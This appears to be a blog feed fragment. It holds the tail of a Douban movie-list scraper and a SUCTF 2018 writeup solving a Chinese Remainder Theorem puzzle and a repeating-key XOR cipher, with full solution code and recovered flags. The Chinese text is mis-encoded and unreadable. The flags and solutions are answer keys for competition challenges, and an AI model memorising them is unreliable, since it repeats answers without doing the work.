ÈÖçÁΩÆcookiesÔºåÊúâ‰∫õËÆ∞ÂΩïÂèØËÉΩËÆæÁΩÆ‰∏∫‰ªÖËá™Â∑±ÂèØËßÅÔºåÈÇ£‰πàÂ∞±ÈúÄË¶ÅÁôªÈôÜÊù•Ëé∑ÂèñÂÆåÊï¥ËÆ∞ÂΩï</span></span><br><span class="line"><span class="comment"># cookie‰∏≠Âè™Ë¶ÅÊúâdbc12Â∞±ÂèØ‰ª•Ë°®ÊòéË∫´‰ªΩ</span></span><br><span class="line">cookies=dict()</span><br><span class="line"><span class="comment"># cookies=dict(dbcl2="xxxxxxxxxxxxxxxxxxx")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(url)</span>:</span></span><br><span class="line">r=requests.get(url,cookies=cookies)</span><br><span class="line">s=BeautifulSoup(r.content,<span class="string">'lxml'</span>)</span><br><span class="line">one_page=s.find_all(name=<span class="string">'a'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'nbg'</span>&#125;)</span><br><span class="line"><span class="keyword">return</span> one_page</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"https://movie.douban.com/people/%s/collect"</span>%username</span><br><span class="line">page_url=<span class="string">"https://movie.douban.com/people/findneo/collect?start=%d"</span></span><br><span class="line">r=requests.get(url,cookies=cookies)</span><br><span class="line">movie_num=int(BeautifulSoup(r.content,<span class="string">'lxml'</span>).title.string[<span class="number">12</span>:<span class="number">-2</span>])</span><br><span class="line">each_page=<span class="number">15</span></span><br><span class="line">page_num=movie_num/each_page+(movie_num%each_page!=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># page_num=1</span></span><br><span class="line">f=open(<span class="string">'res.html'</span>,<span class="string">'w+'</span>)</span><br><span class="line">content=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(page_num):</span><br><span class="line">purl=page_url%(each_page*i)</span><br><span class="line">content+=parse(purl)</span><br><span class="line">html=<span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;&lt;meta charset="UTF-8"/&gt;</span></span><br><span class="line"><span class="string">&lt;style type="text/css"&gt;img&#123; width: 10%%; height: 33.3%%; display: block; float: left;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt; %s's movie(%d)&lt;/title&gt;\n%s</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"""</span>%(username,movie_num,<span class="string">'\n'</span>.join(map(str,content)))</span><br><span class="line"><span class="string">"&lt;html&gt;&lt;body&gt;&lt;title&gt;douban&lt;/title&gt;%s"</span></span><br><span class="line">f.write(html)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2base64</span><span class="params">(infile,outfile)</span>:</span></span><br><span class="line">inf=open(infile)</span><br><span class="line">s=BeautifulSoup(inf,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.find_all(<span class="string">'img'</span>):</span><br><span class="line">i[<span class="string">'src'</span>]=<span class="string">"data:image/jpeg;base64,%s"</span>%base64.b64encode(requests.get(i[<span class="string">'src'</span>]).content)</span><br><span class="line">open(outfile,<span class="string">'w+'</span>).write(str(s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment"># Âú®ÂΩìÂâçÁõÆÂΩï‰∏ãÁîüÊàêres.html</span></span><br><span class="line">main()</span><br><span class="line"><span class="comment"># Â∞ÜÊâÄÊúâÂõæÁâá‰∏ãËΩΩÂπ∂Áî®base64ÁºñÁ†ÅÂ≠òÂÇ®ÔºåÂä†ËΩΩÊó∂Â∞±Êó†ÈúÄ‰ªéË±ÜÁì£ÂÜçËé∑ÂèñÂõæÁâá„ÄÇ</span></span><br><span class="line"><span class="comment"># img2base64('res.html','out.html')</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ÊïàÊûúËßÅ &lt;a href=&quot;https://findneo.github.io/p/movie.html&quot;&gt;findneo ÁöÑËßÇÂΩ±ËÆ∞ÂΩï&lt;/a&gt;  „ÄÇ&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>suctf writeup</title>
    <link href="https://findneo.github.io/180527suctf/"/>
    <id>https://findneo.github.io/180527suctf/</id>
    <published>2018-05-27T14:07:58.000Z</published>
    <updated>2019-01-25T23:21:37.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sandgame"><a href="#sandgame" class="headerlink" title="sandgame"></a>sandgame</h2><p>game.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = int(flag[<span class="number">5</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"sand.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(str(sand)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>solution.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># Ëß£Âêå‰ΩôÊñπÁ®ãÁªÑÔºõ‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÔºåÈü©‰ø°ÁÇπÂÖµÔºåÊâ©Â±ïÊ¨ßÂá†ÈáåÂæóÔºåÊ®°Âèç &lt;= Ê∑±ÂÖ•ÁêÜËß£</span></span><br><span class="line"><span class="comment">#Ê±ÇÊ®°ÂèçÂÖÉÁ¥†ÔºåÊ®°ÈÄÜÂÖÉ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">            a,b = b%a,a</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="comment">#ÂÆö‰πâ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂèÇÊï∞ÂàÜÂà´‰∏∫a,nÔºåËøîÂõûÂÄº‰∏∫b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">findModReverse</span><span class="params">(a,m)</span>:</span><span class="comment">#Ëøô‰∏™Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÊ±ÇÊ®°ÈÄÜ</span></span><br><span class="line">        <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">        v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">        <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">            q = u3//v3</span><br><span class="line">            v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">        <span class="keyword">return</span> u1%m</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line">sand =  [<span class="number">222</span>, <span class="number">203</span>, <span class="number">33</span>, <span class="number">135</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">227</span>, <span class="number">82</span>, <span class="number">239</span>, <span class="number">82</span>, <span class="number">11</span>, <span class="number">220</span>, <span class="number">74</span>, <span class="number">92</span>, <span class="number">8</span>, <span class="number">308</span>, <span class="number">195</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">4</span>]</span><br><span class="line">M=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> holes:</span><br><span class="line">M*=i</span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> enumerate(holes):</span><br><span class="line">mi=j</span><br><span class="line">Mi=M/mi</span><br><span class="line">s=s+findModReverse(Mi,mi)*sand[i]*Mi</span><br><span class="line"><span class="keyword">print</span> str(hex(s%M)[<span class="number">2</span>:<span class="number">-1</span>]).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment"># This_is_the_CRT_xwg)</span></span><br></pre></td></tr></table></figure><p>Èü©‰ø°ÁÇπÂÖµÈóÆÈ¢òÔºåÊ†πÊçÆ‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÊûÑÈÄ†ÈÄöËß£</p><p><img src="1527361456797.png" alt="1527361456797"></p><h2 id="Cycle"><a href="#Cycle" class="headerlink" title="Cycle"></a>Cycle</h2><p>cycle.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span><span class="params">()</span>:</span></span><br><span class="line">    plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"plain.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    key = flag.flag</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(key) &gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">assert</span> flag.languageOfPlain == <span class="string">"English"</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"cipher.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">"base_64"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>cipher.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BwcIRTcACAcJUycaGBFSP4bX6WM7BA0DPw4UTTcAGwcUAAcUAQBJIkBhJE4wGgwEczsMAhMJGxqI</span><br><span class="line">nMY2GwZJP0kmBFIgAQd5EgEJFxEfSToGRy0UAQDP8OUoDVI9Gx0cIwcIF1QlCBwTSSRZUzNVNUkp</span><br><span class="line">AFImEQQSPUNNLxsGBxdHYj8WGBhBIg1LipzYPwAfP08uDRUFGQcITqXJ/zVMKRFLNUE4BGMyPQsf</span><br><span class="line">AANIPQ8ARysHB5ucwCgHAFh0OAgfP2UkQgINSQwCRSRVARFBKAAFAgA2BwYYIE8CA1QHBQptdCIQ</span><br><span class="line">UxhFKwwFAVN0CQcXcxsFAFQFEBoPU0A0EBxJIAUOFgA1Bg1TOwYeRRMHBQptaC8HEAFMKRpLBE4w</span><br><span class="line">SAEaIE8KDBIcGmQ0UCMRFgZNLQdMFgA3BwcHIQABbzUGDU4lQT4YEhoAOwAfDQA8ARpTNQYeEQdi</span><br><span class="line">KAADACkZFhVSIBBLLAAwBwdUJ08eABFIBBcURSYTUwFQIwdLEUg1HEkfOhwZbycADE4UQSMRX1RX</span><br><span class="line">JAwZAAcwSBAcJk8aBBoGCE4AT3V/OxtXbAQeBkh0EQYGcxgMCxoJSRwOUyFKeT0HIUkFClR0BAYc</span><br><span class="line">OAYDAlQOBhxHUyUYFhZPKBBhMkkgAEkAPAIIRQcdGQsVSD8YEhoAKwANEVNeOwYeNk8eEAQNGwYC</span><br><span class="line">UiV/IBtNKUkNBEkmER0SPwpNBxgBGh1taj8GB1RTIwQOEUg9Bg5TGk8OBBpIHRsVTmoBHH5zIwQO</span><br><span class="line">B08wEUk6cwwMC1QDAB0UKgNVBBVOOEkYCk0xHAEaPQhNDwEbHU4LSSEQUwBIJRphIU87RQ0cPEIJ</span><br><span class="line">ChtESQoIT2cRHBsNKAYEb2Q7B0QXPABAARsHRU4DTyVYFxtPRi0ECg0wBwZeNwACSVQMBgFKRCUa</span><br><span class="line">XhBPI2MkDQAdSB4SPRtNFhsFDBoPSSQSUx5VPx1LCUk/DUkHOwYebzAHBkMDTyVYFxtPYEkPCk95</span><br><span class="line">DAYcfgsCCn4sBgFKRCUaXhBPI0VLAU87RQ0cPGUpChtFDQEIDS4aHFgAKAYESEQ7B0QXPABnKhxI</span><br><span class="line">IE4QQSQBUwdPIQwfDUk6D0kZJhwZRRgBAgtHVCIcAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1L</span><br><span class="line">KUkfDUknYiBUJQpNBxENB04VRSsRGhpHbAsECksnSAYVcwABAX48AQtHTC8SFhpEP0kKC0R0HAEW</span><br><span class="line">cwIUERwbYzoPRWoBFgdULQQOC1QnSB0bNhZNERsEDWQzSC9VHhtPIkkKC0R0AR0AcwoOCR0YGgtt</span><br><span class="line">YSQRUydVPAwZCEE6SBwdIQABCQdiKE4UVSMBUxZFKgYZAAA8DUkfOgkZFn4qHBpHaW0YUxpPOEkf</span><br><span class="line">DUV0AwAdN08CA1QYDBwUTyRVBxxBOEkCEQAyAR0AWTwFAFQbCAcDDGoCGxFSKU4PRVk7HUkEMgED</span><br><span class="line">BFQPBlFtaCUCUxlVLwFLHE8hSB4SPQEMRQYBGgVYKgNSHlROIx1LCU87AwAdNE8LCgZIGgEKRSga</span><br><span class="line">Fw0qGwAfDQAnBwQWcxwYFREaARsKQSRVFB1GOBphNk85DUkAJh8IFxwNGwFtcyUYFlRGLQAZHFQ1</span><br><span class="line">BAxTMQMEFgdiIxsUVGoGHBlFOAECC0d0IUkQMgFNEQEaB04TT0AmHBlFLgYPHAAdSAoSPU8ADAcb</span><br><span class="line">YydHVysbB1RTIwQOEUg9Bg5TORoeEVQEAAUCAD4dGgcqBUkcBE4gSBocPgoZDR0GDk4NVTkBUxhJ</span><br><span class="line">JwxLEUg9G2M8O08kRQMJBxpHUyUYFgBIJQcMRUohGx1TPwYGAFQcAQcUKg4aHFlEIwZGAU87REkX</span><br><span class="line">PABAARsHRAoIT0AxHBsNKAYESEQ7B0VTNwACSBAHBmQjTyVYFxtPYQ0ECgx0DAYcfgsCClkMBgFt</span><br><span class="line">byJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFioQBwZeNwACSBAHBkJHRCUaXhBPI0QP</span><br><span class="line">Ck9eLAYcfgsCClkMBgFLAC4aHFlEIwZhIU87RQ0cPEIJChtESQoIT2cRHBsNKAYEb3c8DRsWdAtN</span><br><span class="line">HBVIHg8JTitVFBsfRiEEEgA5HQobcxYCEFQfCAAJQWoHGgdLc2MiQk10BgYHcwMCCh8BBwlHRiUH</span><br><span class="line">UwdPIQwJCkQtYj4aJwdNFhsFDE4UVToQARxVIQgFRUc9Dh0AWTwCCBFIGhsXRTgdFgZPRjoECEV0</span><br><span class="line">DggaIRYZBBgNSQwLSTkGeT5VPx1LFk85DR0bOgEKRT1ICg8JAD4AARoAOAZhNk85DQscNxZNLFQL</span><br><span class="line">CABHSyMGAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1LKUkfDUknYiYbcyZNEhUGHU4UTycQBxxJ</span><br><span class="line">Ig5LD1UnHEkfOgQIRQAAAB1tbyJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFiobAEk6</span><br><span class="line">cxgMCwBIGgEKRT4dGhpHbAMeFlR0BAAYNk8ZDR0b</span><br></pre></td></tr></table></figure><p>Á±ª‰ººÁª¥ÂêâÂ∞º‰∫öÁöÑÂèòÁßçÔºåkeyÈïøÂ∫¶ËøúÂ∞è‰∫éplainÔºåÂæ™ÁéØÂºÇÊàñÂêéÂèØÁªüËÆ°Â≠óÈ¢ëÔºåÂçóÈÇÆCTFÂπ≥Âè∞Êúâ‰∏ÄÈ¢òÁõ∏‰ººÁöÑ„ÄÇËØ¶ËßÅ <a href="https://findneo.github.io/171005NuptVigenereWP/">https://findneo.github.io/171005NuptVigenereWP/</a> „ÄÇÁ®çÂæÆÊõ¥ÊîπÂÖ∂‰∏≠ËØªÂèñÂØÜÊñáÈÉ®ÂàÜÂç≥ÂèØ„ÄÇ<code>flag{Something Just Like This}</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(file=<span class="string">'code.txt'</span>)</span>:</span></span><br><span class="line">    <span class="string">'''‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÂçÅÂÖ≠ËøõÂà∂‰∏≤ÔºåËøîÂõûÂçÅÂÖ≠ËøõÂà∂Êï∞ÁªÑ</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    c=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:x.strip(),open(<span class="string">'cipher.txt'</span>).readlines())).decode(<span class="string">'base_64'</span>)</span><br><span class="line">    cc= [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">    <span class="comment"># print cc,len(cc)</span></span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line">    <span class="comment"># c = open(file).read()</span></span><br><span class="line">    <span class="comment"># codeintlist = []</span></span><br><span class="line">    <span class="comment"># codeintlist.extend(</span></span><br><span class="line">    <span class="comment">#     (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2))))</span></span><br><span class="line">    <span class="comment"># return codeintlist</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' ‰º†ÂÖ•ÁöÑÂØÜÊñá‰∏≤„ÄÅÊòéÊñáÂ≠óÁ¨¶ÈõÜ„ÄÅÂØÜÈí•Â≠óÁ¨¶ÈõÜ„ÄÅÂØÜÈí•ÈïøÂ∫¶ËåÉÂõ¥Âùá‰Ωú‰∏∫Êï∞Â≠óÂàóË°®Â§ÑÁêÜ.ÂΩ¢Â¶Ç[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        ËøîÂõû‰∏Ä‰∏™Â≠óÂÖ∏Ôºå‰ª•ÂèØËÉΩÁöÑÂØÜÈí•ÈïøÂ∫¶‰∏∫ÈîÆÔºå‰ª•ÂØπÂ∫îÁöÑÊØè‰∏ÄÂ≠óËäÇÁöÑÂØÜÈí•Â≠óÁ¨¶ÈõÜÊûÑÊàêÁöÑÂàóË°®‰∏∫ÂÄºÔºåÂØÜÈí•Â≠óÁ¨¶ÈõÜ‰∏∫Êï∞Â≠óÂàóË°®„ÄÇ</span></span><br><span class="line"><span class="string">            ÂΩ¢Â¶Ç&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''‰º†ÂÖ•Â≠óÂÖ∏ÔºåÂΩ¢Â¶Ç&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        ËøîÂõûÂèØËÉΩÊÄßÔºå0~1,ÂÄºË∂äÂ§ßÂèØËÉΩÊÄßË∂äÂ§ß</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span 